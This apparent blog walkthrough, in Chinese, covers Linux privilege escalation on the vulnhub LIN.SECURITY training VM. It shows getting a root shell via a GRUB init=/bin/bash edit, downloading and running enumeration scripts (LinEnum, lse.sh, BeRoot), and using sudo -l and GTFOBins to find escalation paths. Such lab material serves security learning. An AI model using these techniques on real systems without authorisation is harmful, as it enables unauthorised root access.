@@ -1,0 +1,2036 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#00FFFF">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-corner-indicator.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#00FFFF">
+
+
+
+
+
+  <meta name="keywords" content="Linux提权,靶机渗透," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="通过  vulnhub-LIN.SECURITY靶机学习linux提权">
+<meta name="keywords" content="Linux提权,靶机渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="通过LIN.SECURITY靶机学习linux提权">
+<meta property="og:url" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;index.html">
+<meta property="og:site_name" content="CyzCc&#39;s blog">
+<meta property="og:description" content="通过  vulnhub-LIN.SECURITY靶机学习linux提权">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;20191207105956849.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;20191207110056422.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;20191207110225780.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;20191207110341303.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592824440957.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592824900489.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592829008539.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1590843558640.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1590843569852.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1590843612115.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1590843639246.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592829939705.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592830225020.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1591968965598.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1591969365844.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1591969875484.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592832167027.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592833753662.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592833818823.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592833852803.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592880197935.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592881118095.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592881595036.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592881960486.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592882175074.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592662561046.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592662724337.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592835598272.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592834918819.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592836118929.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592840613216.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592840705377.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592836209506.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592836496817.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592879116735.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592879290449.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592897611985.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592898274698.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592898522337.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592898726491.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592898980254.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592899077861.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592899203987.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592902461569.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592902516686.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592903090831.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592903198145.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592817734754.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592872154310.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592872228674.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592872467958.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592872807490.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592872955100.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592818118936.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592904523563.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592904547093.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592904662891.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592905283872.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592906242457.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592906414669.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592906671750.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;1592907110828.png">
+<meta property="og:updated_time" content="2020-06-26T11:20:50.878Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;23&#x2F;linux-tiquan&#x2F;20191207105956849.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://cyzcc.vip/2020/06/23/linux-tiquan/"/>
+
+
+
+
+<!--留言-->
+
+  <script>
+  (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/0f81ff2f.js","daovoice")
+  daovoice('init', {
+      app_id: "9e261f4f"
+    });
+  daovoice('update');
+  </script>
+
+
+  <title>通过LIN.SECURITY靶机学习linux提权 | CyzCc's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">CyzCc's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">♫日常学习笔记整理♬♬</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-主页|随笔">
+          <a href="/home/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            主页|随笔
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-一些知识点">
+          <a href="/guestbook/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-comments"></i> <br />
+            
+            一些知识点
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于我">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于我
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-归档">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-link"></i> <br />
+            
+            友链
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://cyzcc.vip/2020/06/23/linux-tiquan/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="CyzCc">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CyzCc's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">通过LIN.SECURITY靶机学习linux提权</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-23T18:50:56+08:00">
+                2020-06-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2020/06/23/linux-tiquan/" class="leancloud_visitors" data-flag-title="通过LIN.SECURITY靶机学习linux提权">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>浏览
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  6.4k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  26
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><strong>通过  vulnhub-LIN.SECURITY靶机学习linux提权</strong></p>
+<a id="more"></a>
+
+<h1 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h1><p>靶机地址：<a href="https://www.vulnhub.com/entry/linsecurity-1,244/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/linsecurity-1,244/</a><br>靶机难度：中级（CTF）<br>靶机发布日期：2018年7月11日<br>靶机描述：在in.security，我们希望开发一个Linux虚拟机，该虚拟机在编写本文时基于最新的Ubuntu发行版（18.04 LTS），但存在许多漏洞，这些漏洞使用户无法升级扎根在盒子上。旨在帮助理解某些内置应用程序和服务（如果配置错误）可能会被攻击者滥用。<br>我们已将该框配置为模拟真实世界的漏洞（尽管位于单个主机上），这将帮助您完善本地特权升级技能，技术和工具集。从简单到中级都有许多挑战，我们很高兴看到您用来解决这些挑战的方法！<br>该图像不到1.7 GB，可以使用上面的链接下载。打开OVA文件时，将导入并使用NAT适配器配置名为lin.security的VM，但是可以通过首选虚拟化平台的首选项将其更改为桥接。<br>首先，您可以使用以下凭据登录主机：bob / secret<br>目标：得到root权限</p>
+<h1 id="网络配置-无法获取ip"><a href="#网络配置-无法获取ip" class="headerlink" title="网络配置(无法获取ip)"></a>网络配置(无法获取ip)</h1><h2 id="第一种情况："><a href="#第一种情况：" class="headerlink" title="第一种情况："></a><strong>第一种情况：</strong></h2><p> <strong>通过netplan设置网络。</strong></p>
+<p><strong>1.1</strong>在开机时按下Shift键进入以下界面<br><img src="/2020/06/23/linux-tiquan/20191207105956849.png" alt="在这里插入图片描述"><br><strong>1.2</strong>在此页面按下e键，进入如下界面<br><img src="/2020/06/23/linux-tiquan/20191207110056422.png" alt="在这里插入图片描述"><br><strong>1.3</strong>将ro 替换为 rw signie init=/bin/bash<br><img src="/2020/06/23/linux-tiquan/20191207110225780.png" alt="在这里插入图片描述"><br><strong>1.4</strong>按下Ctrl键+X键，进入如下页面<br><img src="/2020/06/23/linux-tiquan/20191207110341303.png" alt="在这里插入图片描述"><br><strong>1.5</strong>查看当前网卡IP信息 ip a</p>
+<p><img src="/2020/06/23/linux-tiquan/1592824440957.png" alt="1592824440957"></p>
+<p>1.6ifconfig -a看到有一块ens33的网卡，但是没有生效。  </p>
+<p>sudo vim /etc/netplan/50-cloud-init.yaml<br>将enp0s3改为ens33<br>sudo netplan apply重启网络</p>
+<p><img src="/2020/06/23/linux-tiquan/1592824900489.png" alt="1592824900489"></p>
+<p>重启便能获得ip</p>
+<p><img src="/2020/06/23/linux-tiquan/1592829008539.png" alt="1592829008539"></p>
+<h2 id="第二种情况："><a href="#第二种情况：" class="headerlink" title="第二种情况："></a><strong>第二种情况：</strong></h2><p><strong>通过network设置网络</strong></p>
+<p>参考文章：<a href="https://blog.csdn.net/Eastmount/article/details/106066009" target="_blank" rel="noopener">https://blog.csdn.net/Eastmount/article/details/106066009</a></p>
+<p>到开机页面选择第二个Ubuntu的高级选项，如果启动网络正常的话可以直接开机，如果网络不正常可以按下面步骤操作。进入高级选项，再次选择第二个Linux内核版本的恢复模式回车。<br><img src="/2020/06/23/linux-tiquan/1590843558640.png" alt="1590843558640"></p>
+<p>回车后会弹出选择界面，选择root一行回车，接着再次回车进入命令行模式。</p>
+<p><img src="/2020/06/23/linux-tiquan/1590843569852.png" alt="1590843569852"></p>
+<p>输入<code>&quot;mount -o rw,remount / &quot;</code>命令，再配置网络问卷，否则后面可能无法保存网络配置文件，这个命令让我们的 / 路径文件系统的可读模式能自由修改。接着输入命令查看网卡。</p>
+<blockquote>
+<p>mount -o rw,remount /<br>ifconfig -a</p>
+</blockquote>
+<p><img src="/2020/06/23/linux-tiquan/1590843612115.png" alt="1590843612115"></p>
+<p>这里是ens33，然后继续输入命令修改网络配置文件。输入I修改模式，如下图所示。</p>
+<blockquote>
+<p>vi /etc/network/interfaces</p>
+</blockquote>
+<p>修改这两个地方，改成你的网卡名称(ens33)，然后输入“:wq”保存。<br><img src="/2020/06/23/linux-tiquan/1590843639246.png" alt="1590843639246"></p>
+<p>最后输入reboot重启即可。</p>
+<p>这里使用第一种方法获取ip为192.168.211.161<br>开放的端口为<br><img src="/2020/06/23/linux-tiquan/1592829939705.png" alt="1592829939705"></p>
+<p>由于这里主要是学习提权，所以直接使用官方给出的bob/secret账号通过ssh连接</p>
+<p><img src="/2020/06/23/linux-tiquan/1592830225020.png" alt="1592830225020"></p>
+<h1 id="提权辅助工具"><a href="#提权辅助工具" class="headerlink" title="提权辅助工具"></a>提权辅助工具</h1><h2 id="LinEnum"><a href="#LinEnum" class="headerlink" title="LinEnum"></a>LinEnum</h2><p>这是一个非常基本的shell脚本，它执行65次以上的检查，从内核信息到定位可能的升级点（包括可能有用的SUID / GUID文件以及Sudo / rhost错误配置等等），都可以得到任何信息</p>
+<p>常⽤命令：<code>./LinEnum.sh -r report -e /tmp/ -t</code> ⽣成的结果将导出到 /tmp/report ⽂件。直接执行也会在当前目录下生成report-12-06-20文件。</p>
+<blockquote>
+<ul>
+<li>-k输入关键字</li>
+<li>-e输入导出位置</li>
+<li>-t包括全面（冗长）的测试</li>
+<li>-s提供当前用户密码以检查sudo perms（不安全）</li>
+<li>-r输入报告名称</li>
+<li>-h显示此帮助文本</li>
+</ul>
+</blockquote>
+<p><a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">工具下载地址</a><br><a href="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" target="_blank" rel="noopener">地址二</a></p>
+<p><img src="/2020/06/23/linux-tiquan/1591968965598.png" alt="1591968965598"></p>
+<p><img src="/2020/06/23/linux-tiquan/1591969365844.png" alt="1591969365844"></p>
+<h2 id="LinuxSmartEnumeration"><a href="#LinuxSmartEnumeration" class="headerlink" title="LinuxSmartEnumeration"></a>LinuxSmartEnumeration</h2><p>该Shell脚本将显示有关本地Linux系统安全性的相关信息。<br>它还可以<strong>监视进程以发现循环程序执行</strong>。在执行所有其他测试时进行监视，因此可以节省一些时间。默认情况下，它会在1分钟内进行监控，可以通过<code>-p</code>参数选择观看时间。</p>
+<p>它具有3种详细程度，因此您可以控制看到的信息量。</p>
+<p>在默认级别，可以看到系统中非常重要的安全漏洞。级别<code>1</code>（<code>./lse.sh -l1</code>）显示了有助于您获得特权的有趣信息。级别<code>2</code>（<code>./lse.sh -l2</code>）只会转储它收集的有关系统的所有信息。</p>
+<p>默认情况下，它将询问您一些问题：主要是当前的用户密码（如果知道的话；），以便可以进行一些其他测试。</p>
+<p><a href="https://github.com/diego-treitos/linux-smart-enumeration" target="_blank" rel="noopener">下载 地址</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget <span class="string">"https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh"</span> -O lse.sh;chmod <span class="number">700</span> lse.sh</span><br><span class="line"></span><br><span class="line">curl <span class="string">"https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh"</span> -Lo lse.sh;chmod <span class="number">700</span> lse.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/23/linux-tiquan/1591969875484.png" alt="1591969875484"></p>
+<p>First you should execute it just like ./lse.sh. If you see some green yes!, you probably have already some good stuff to work with.</p>
+<h2 id="BeRootProject"><a href="#BeRootProject" class="headerlink" title="BeRootProject"></a>BeRootProject</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python beroot<span class="selector-class">.py</span> --password super_strong_password</span><br></pre></td></tr></table></figure>
+
+<p>这个⼯具包含了GTFOBins所提到的⽂件列表，也就是说，可以检查出⼀些通过sudo运⾏即可提权 的⽂件。</p>
+<p><a href="https://github.com/AlessandroZ/BeRoot" target="_blank" rel="noopener">下载地址</a></p>
+<h1 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h1><h2 id="关于sudo"><a href="#关于sudo" class="headerlink" title="关于sudo"></a>关于sudo</h2><p>sudo是给普通用户某个命令有root权限，并不需要给root密码，普遍的做法就是利用sudo （Substitute User and Do 的简写）给其临时授权,临时让其以root 权限运行某个程序。</p>
+<h2 id="sudo的执行原理"><a href="#sudo的执行原理" class="headerlink" title="sudo的执行原理"></a>sudo的执行原理</h2><p>普通用户执行命令 -&gt; 检查<code>/var/db/sudo/</code>目录下是否有用户时间戳 -&gt; 检查<code>/etc/sudoers</code>配置文件，用户是否有sudo权限 -&gt; 执行sudo命令并反回结果 -&gt; 退出sudo返回普通用户shell环境。<br>其中步骤2检查：时间戳默认从上一次执行sudo命令5分钟后过期。</p>
+<p>要利用sudo提权，需要配置<code>/etc/sudoers</code> 或者使用<code>visudo</code>命令进行编辑。</p>
+<p>文件语法：</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root <span class="keyword">ALL</span>=(<span class="keyword">ALL</span>) <span class="keyword">ALL</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>root表示用户名</li>
+<li>第一个 ALL 指示允许从任何终端、机器访问sudo</li>
+<li>第二个 (ALL)指示sudo命令被允许以任何用户身份执行</li>
+<li>第三个 ALL 表示所有命令都可以作为root执行</li>
+</ul>
+<h2 id="提权演示"><a href="#提权演示" class="headerlink" title="提权演示"></a>提权演示</h2><ol>
+<li>sudo -l ：查看当前⽤⼾sudo⽀持的命令</li>
+</ol>
+<p><img src="/2020/06/23/linux-tiquan/1592832167027.png" alt="1592832167027"></p>
+<p>  在线查询sudo的提权命令：<a href="https://gtfobins.github.io/" target="_blank" rel="noopener">https://gtfobins.github.io/</a></p>
+<p>通过ash提权</p>
